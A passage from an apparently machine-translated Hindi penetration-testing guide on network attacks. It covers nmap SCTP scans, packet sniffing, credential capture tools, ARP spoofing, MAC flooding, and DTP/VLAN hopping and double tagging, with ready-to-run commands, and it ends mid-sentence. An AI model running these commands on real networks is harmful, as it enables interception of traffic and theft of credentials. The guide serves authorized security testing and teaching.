SCTP TCP рдФрд░ UDP рдХреЗ рд╕рд╛рде рд╣реЛрддрд╛ рд╣реИред IP рдкрд░ рджреВрд░рд╕рдВрдЪрд╛рд░ рдбреЗрдЯрд╛ рдХреА рдкрд░рд┐рд╡рд╣рди рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдорд┐рдд, рдпрд╣ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ Signaling System 7 (SS7) рдХреА рдХрдИ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЛ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдПрдХ рдмрдбрд╝реЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкрд░рд┐рд╡рд╛рд░ рдХрд╛ рдЖрдзрд╛рд░ рд╣реИ рдЬрд┐рд╕реЗ SIGTRAN рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред SCTP рдХрд╛ рд╕рдорд░реНрдерди рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдЬреИрд╕реЗ IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS, рдФрд░ VxWorks рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

nmap рджреНрд╡рд╛рд░рд╛ SCTP рдХреЗ рд▓рд┐рдП рджреЛ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдХреИрди рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: _-sY_ рдФрд░ _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS рдФрд░ IPS рдЙрдкреЗрдХреНрд╖рдг

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **рдФрд░ nmap рд╡рд┐рдХрд▓реНрдк**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### рдЖрдВрддрд░рд┐рдХ рдЖрдИрдкреА рдкрддреЗ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд░рд╛рдЙрдЯрд░, рдлрд╝рд╛рдпрд░рд╡реЙрд▓, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЙрдкрдХрд░рдг рдХрднреА-рдХрднреА **рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдмреНрд╕ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрддреЗ рд╣реИрдВ** рдЬреЛ **рдЧреИрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд╕реНрд░реЛрдд рдкрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рддреЗ рд╣реИрдВред рдЖрдк рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рджреМрд░рд╛рди **рдирд┐рдЬреА рдкрддреЛрдВ** рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкреИрдХреЗрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП _tcpdump_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, Kali Linux рдореЗрдВ _eth2_ рдЗрдВрдЯрд░рдлреЗрд╕ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЗрдВрдЯрд░рдиреЗрдЯ** рд╕реЗ **рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (рдпрджрд┐ рдЖрдк **рдПрдХ NAT** рдпрд╛ **рдлрд╝рд╛рдпрд░рд╡реЙрд▓** рдХреЗ **рдкреАрдЫреЗ** рд╣реИрдВ рддреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯреНрд╕ **рдлрд╝рд┐рд▓реНрдЯрд░** рд╣реЛрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ)ред
```bash
tcpdump тАУnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## рд╕реНрдирд┐рдлрд┐рдВрдЧ

рд╕реНрдирд┐рдлрд┐рдВрдЧ рдХреЗ рдЬрд░рд┐рдП рдЖрдк рдХреИрдкреНрдЪрд░ рдХрд┐рдП рдЧрдП рдлреНрд░реЗрдо рдФрд░ рдкреИрдХреЗрдЯ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдХреЗ рдЖрдИрдкреА рд░реЗрдВрдЬ, рд╕рдмрдиреЗрдЯ рд╕рд╛рдЗрдЬрд╝, рдПрдордПрд╕реА рдкрддреЗ, рдФрд░ рд╣реЛрд╕реНрдЯрдиреЗрдореНрд╕ рдХреЗ рд╡рд┐рд╡рд░рдг рд╕реАрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдЧрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЧрд▓рддреА рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рд╕реНрд╡рд┐рдЪрд┐рдВрдЧ рдлреИрдмреНрд░рд┐рдХ рддрдирд╛рд╡ рдореЗрдВ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдкреИрд╕рд┐рд╡ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдирд┐рдлрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдПрдХ рд╕реНрд╡рд┐рдЪреНрдб рдЗрдерд░рдиреЗрдЯ рдиреЗрдЯрд╡рд░реНрдХ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдХреЗрд╡рд▓ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдлреНрд░реЗрдореНрд╕ рдФрд░ рдЖрдкрдХреЗ рдПрдордПрд╕реА рдкрддреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рд╛рдордЧреНрд░реА рджреЗрдЦреЗрдВрдЧреЗред

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
рдПрдХ рд╡реНрдпрдХреНрддрд┐, рдПрдХ SSH рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Wireshark рдХрд╛ GUI рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ рд░рд┐рдореЛрдЯ рдорд╢реАрди рд╕реЗ рдкреИрдХреЗрдЯ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### рдмреЗрдЯрд░рдХреИрдк
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

рд╕реНрдкрд╖реНрдЯред

### рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрдкреНрдЪрд░

рдЖрдк [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк pcap рдпрд╛ рд▓рд╛рдЗрд╡ рдЗрдВрдЯрд░рдлреЗрд╕ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░ рд╕рдХреЗрдВред

## LAN рд╣рдорд▓реЗ

### ARP рд╕реНрдкреВрдлрд┐рдВрдЧ

ARP рд╕реНрдкреВрдлрд┐рдВрдЧ рдореЗрдВ рдирд┐:рд╢реБрд▓реНрдХ ARPResponses рднреЗрдЬрдиреЗ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рд╕реНрдкрд╖реНрдЯ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдорд╢реАрди рдХрд╛ рдЖрдИрдкреА рд╣рдорд╛рд░реА рдбрд┐рд╡рд╛рдЗрд╕ рдХрд╛ MAC рд╣реИред рдлрд┐рд░, рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ ARP рддрд╛рд▓рд┐рдХрд╛ рдмрджрд▓ рджреЗрдЧрд╛ рдФрд░ рдЬрдм рднреА рд╡рд╣ рдЖрдИрдкреА рд╕реНрдкреВрдл рдХреЛ рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдЧрд╛ рддреЛ рд╣рдорд╛рд░реА рдорд╢реАрди рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░реЗрдЧрд╛ред

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **рдЖрд░реНрдкреАрд╕реНрдкреВрдл**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC рднрд░рд╛рдИ - CAM рдУрд╡рд░рдлреНрд▓реЛ

рд╕реНрд╡рд┐рдЪ рдХреА CAM рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░реЗрдВ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рд╕реНрд░реЛрдд MAC рдкрддреЗ рдХреЗ рд╕рд╛рде рдмрд╣реБрдд рд╕рд╛рд░реЗ рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВред рдЬрдм CAM рддрд╛рд▓рд┐рдХрд╛ рднрд░ рдЬрд╛рддреА рд╣реИ, рддреЛ рд╕реНрд╡рд┐рдЪ рд╣рдм рдХреА рддрд░рд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рджреЗрддрд╛ рд╣реИ (рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдХрд░рдирд╛)ред
```bash
macof -i <interface>
```
### 802.1Q VLAN / DTP рд╣рдорд▓реЗ

#### рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ

**DTP (рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓)** рдПрдХ рд▓рд┐рдВрдХ рдкрд░рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ рдПрдХ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЯреНрд░рдВрдХрд┐рдВрдЧ рдкреНрд░рдгрд╛рд▓реА рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред DTP рдХреЗ рд╕рд╛рде, рд╕реНрд╡рд┐рдЪ рддрдп рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдкреЛрд░реНрдЯ рдЯреНрд░рдВрдХ рдореЛрдб (рдЯреНрд░рдВрдХ) рдореЗрдВ рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдФрд░ рдХреМрди рдирд╣реАрдВред **DTP рдХрд╛ рдЙрдкрдпреЛрдЧ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рдЬрд╝рд╛рдЗрди рдореЗрдВ рдХрдореА рд╣реИред** **рдЯреНрд░рдВрдХ рдХреЗрд╡рд▓ рдЙрдиреНрд╣реАрдВ рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП** рдЬрд╣рд╛рдВ рдЙрдиреНрд╣реЗрдВ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдФрд░ рдЗрд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рд╕рднреА рд╕реНрд╡рд┐рдЪ рдкреЛрд░реНрдЯ рдбрд╛рдпрдирд╛рдорд┐рдХ рдСрдЯреЛ рдореЛрдб рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВред** рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рд╕реНрд╡рд┐рдЪ рдкреЛрд░реНрдЯ рдЯреНрд░рдВрдХ рдкреНрд░рд╛рд░рдВрдн рдореЛрдб рдореЗрдВ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдкрдбрд╝реЛрд╕реА рд╕реНрд╡рд┐рдЪ рд╕реЗред **рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рдХреЛ рд╕реНрд╡рд┐рдЪ рд╕реЗ рдЬреБрдбрд╝рдиреЗ рдФрд░ рдбреАрдЯреАрдкреА рдЗрдЪреНрдЫреБрдХ рдлреНрд░реЗрдо рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**, рдЬрд┐рд╕рд╕реЗ рдкреЛрд░реНрдЯ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рд╣реЛ рдЬрд╛рдПред рд╣рдорд▓рд╛рд╡рд╛рдж рдлрд┐рд░ VLANs рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдПрд╕рдЯреАрдкреА рдлреНрд░реЗрдо рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдХрд░ VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдХрдИ рд╕реНрд╡рд┐рдЪ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (DTP) рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрд┐рд╕рдХрд╛ рджреБрд╖реНрдкреНрд░рднрд╛рд╡реА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдПрдХ рд╡рд┐рд░реЛрдзреА рд╕реНрд╡рд┐рдЪ рдмрдирд╛рдиреЗ рдФрд░ рд╕рднреА VLANs рдХреЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдЙрдкрдХрд░рдг [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) рдПрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд░рд┐рдкреЛрд░реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рд╕реНрд╡рд┐рдЪ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдореЛрдб, рдЯреНрд░рдВрдХ, рдбрд╛рдпрдирд╛рдорд┐рдХ, рдСрдЯреЛ рдпрд╛ рдПрдХреНрд╕реЗрд╕ рдореЛрдб рдореЗрдВ рд╣реИ** (рдпрд╣ рд╡рд╣ рдПрдХрдорд╛рддреНрд░ рд╣реИ рдЬреЛ VLAN рд╣реЙрдкрд┐рдВрдЧ рд╕реЗ рдмрдЪреЗрдЧрд╛)ред рдЙрдкрдХрд░рдг рджрд░реНрд╢рд╛рдПрдЧрд╛ рдХрд┐ рд╕реНрд╡рд┐рдЪ рдХреНрдпрд╛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рд╣реИ рдпрд╛ рдирд╣реАрдВред

рдЕрдЧрд░ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХ рд╡рд┐рдХрд▓реНрдкрдиреАрдп рд╣реИ, рддреЛ рдЖрдк _**Yersinia**_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдПрдХ "**рдЯреНрд░рдВрдХрд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ**" рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЯреЛрдХреЙрд▓ "**DTP**" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрдк рд╕рднреА VLANs рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯ рджреЗрдЦ рд╕рдХреЗрдВрдЧреЗред
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

VLANs рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде DTP рдЗрдЪреНрдЫреБрдХ рдлреНрд░реЗрдо рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдХрд┐рд╕реА рднреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдмрд╛рдзрд┐рдд рди рдХрд░реЗрдВред рдпрд╣ рд╣рд░ рддреАрди рд╕реЗрдХрдВрдб рдореЗрдВ DTP рдЗрдЪреНрдЫреБрдХ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИред **рд╕реНрд╡рд┐рдЪ рдкрд░ рдбрд╛рдорд╛рдЗрдХреНрд░реЗрдЯрд┐рдХрд▓реА рдмрдирд╛рдП рдЧрдП рдЯреНрд░рдВрдХ рдЪреИрдирд▓ рдХреЗрд╡рд▓ рдкрд╛рдВрдЪ рдорд┐рдирдЯ рдХреЗ рд▓рд┐рдП рд░рд╣рддреЗ рд╣реИрдВред рдкрд╛рдВрдЪ рдорд┐рдирдЯ рдХреЗ рдмрд╛рдж, рдЯреНрд░рдВрдХ рдЧрд┐рд░ рдЬрд╛рддрд╛ рд╣реИред**
```
sudo python3 DTPHijacking.py --interface eth0
```
рдореИрдВ рдпрд╣ рджрд░реНрд╢рд╛рдирд╛ рдЪрд╛рд╣реВрдВрдЧрд╛ рдХрд┐ **Access/Desirable (0x03)** рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ DTP рдлреНрд░реЗрдо рд╡рд╛рдВрдЫрдиреАрдп рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╣реИ, рдЬреЛ рдкреЛрд░реНрдЯ рдХреЛ рдЯреНрд░рдВрдХ рдореЛрдб рдкрд░ рд╕реНрд╡рд┐рдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИред рдФрд░ **802.1Q/802.1Q (0xa5)** рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ **802.1Q** рдПрдиреНрдХреИрдкреНрд╕реБрд▓реЗрд╢рди рдкреНрд░рдХрд╛рд░ред

STP рдлреНрд░реЗрдо рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ, **рд╣рдореЗрдВ VLAN 30 рдФрд░ VLAN 60 рдХреЗ рдЕрд╕реНрддрд┐рддреНрд╡ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИред**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### рд╡рд┐рд╢реЗрд╖ VLAN рдкрд░ рд╣рдорд▓рд╛

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк VLAN IDs рдФрд░ IPs рдорд╛рдиреЛрдВ рдХреЛ рдЬрд╛рди рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдПрдХ рд╡рд┐рд╢реЗрд╖ VLAN рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдЕрдЧрд░ DHCP рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ, рддреЛ рд╕реНрдерд┐рд░ IP рдкрддрд╛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП _ifconfig_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд VLAN рд╣реЙрдкрд░

**рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдирд╛ рдФрд░ рдЕрдиреНрдп VLAN рдореЗрдВ рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдЦреЛрдЬ** рдХреА рдЪрд░реНрдЪрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣рдорд▓рд╛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ** рдЙрдкрдХрд░рдг рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### рдбрдмрд▓ рдЯреИрдЧрд┐рдВрдЧ

рдпрджрд┐ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреАрдбрд╝рд┐рдд рд╣реЛрд╕реНрдЯ рдХреЗ **MAC, IP рдФрд░ VLAN ID** рдХреА рдорд╛рди рдкрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЙрд╕рдХреЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд VLAN рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЗ VLAN рдХреЗ рд╕рд╛рде рдПрдХ рдлреНрд░реЗрдо **рдбрдмрд▓ рдЯреИрдЧ рдХрд░рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ **рдкреАрдбрд╝рд┐рдд рдЖрдХреНрд░рдордгрдХрд░реНрддрд╛ рд╕реЗ рд╡рд╛рдкрд╕ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдЧрд╛**, рдЗрд╕рд▓рд┐рдП **рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡реЛрддреНрддрдо рд╡рд┐рдХрд▓реНрдк рд╣реИ UDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░рдирд╛** рдЬреЛ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ SNMP)ред

рдЖрдХреНрд░рдордгрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реИ рдХрд┐ рд╡рд╣ рдПрдХ **TCP рдкреЛрд░реНрдЯ рд╕реНрдХреИрди рд▓реЙрдиреНрдЪ рдХрд░реЗ рдЬрд┐рд╕рдореЗрдВ рдЖрдХреНрд░рдордгрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдПрдХ IP рдХрд╛ рд╕реНрдкреВрдлрд┐рдВрдЧ рдХрд░реЗрдВ рдФрд░ рдкреАрдбрд╝рд┐рдд рджреНрд╡рд╛рд░рд╛ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ** (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ)ред рдлрд┐рд░, рдЖрдХреНрд░рдордгрдХрд░реНрддрд╛ рджреВрд╕рд░реЗ рд╣реЛрд╕реНрдЯ рдореЗрдВ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддрд╛ рд╣реИ 